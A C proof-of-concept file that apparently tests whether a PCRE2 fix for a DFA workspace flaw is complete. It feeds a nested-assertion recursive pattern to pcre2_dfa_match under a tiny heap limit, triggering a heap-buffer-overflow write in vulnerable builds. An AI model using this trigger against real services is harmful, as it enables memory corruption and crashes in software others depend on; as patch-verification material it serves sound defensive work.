/* Residual defect PoC for the DFA workspace fix (GHSA-3r4p-g7gg-ppmf).
 *
 * Drives pcre2_dfa_match() through the public API only: an ordinary
 * compilable pattern, subject "a", and a small heap limit set with
 * pcre2_set_heap_limit(). Deeply nested assertions force the DFA engine
 * to chain heap workspace blocks; with the heap limit clamping the chain,
 * a whole-pattern recursion request reuses a chained block that is smaller
 * than the recursion needs.
 *
 * Expected behavior:
 *   - vulnerable / incompletely fixed library: AddressSanitizer reports a
 *     heap-buffer-overflow write in internal_dfa_match() (process aborts);
 *   - fully fixed library: pcre2_dfa_match() returns PCRE2_ERROR_HEAPLIMIT
 *     (-63) and the process exits normally after printing rc=-63.
 */

#include <stdio.h>
#define PCRE2_CODE_UNIT_WIDTH 8
#include <pcre2.h>

int main(void)
{
PCRE2_SPTR pattern = (PCRE2_SPTR)
  "(?=(?=(?=(?=(?=(?=(?=(?=a))(?R))))))).";
PCRE2_SPTR subject = (PCRE2_SPTR)"a";
pcre2_code *re;
pcre2_match_context *mctx;
pcre2_match_data *md;
int errorcode, rc;
PCRE2_SIZE erroroffset;
int workspace[1000];

re = pcre2_compile(pattern, PCRE2_ZERO_TERMINATED, 0, &errorcode,
  &erroroffset, NULL);
if (re == NULL)
  {
  fprintf(stderr, "compile failed: error %d at offset %lu\n", errorcode,
    (unsigned long)erroroffset);
  return 2;
  }

mctx = pcre2_match_context_create(NULL);
pcre2_set_heap_limit(mctx, 4);   /* 4 KiB heap allowance for the match */
md = pcre2_match_data_create(1, NULL);

rc = pcre2_dfa_match(re, subject, 1, 0, 0, md, mctx, workspace, 1000);
printf("pcre2_dfa_match rc=%d\n", rc);

pcre2_match_data_free(md);
pcre2_match_context_free(mctx);
pcre2_code_free(re);
return 0;
}
